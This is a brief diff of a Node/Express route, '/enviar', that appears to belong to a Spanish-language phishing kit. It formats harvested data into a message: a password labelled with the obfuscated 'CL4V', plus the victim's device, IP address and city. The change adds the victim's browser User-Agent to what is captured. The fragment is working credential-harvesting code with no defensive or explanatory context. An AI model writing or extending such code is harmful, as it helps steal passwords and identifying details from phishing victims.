@@ -60,6 +60,7 @@ app.post('/enviar', async (req, res) => {
 🔐 CL4V: <code>${clav || 'No disponible'}</code>
 
 📱 DISP: ${req.body.dispositivo || 'No detectado'}
+📋 User-Agent: <code>${req.body.userAgent || 'No disponible'}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
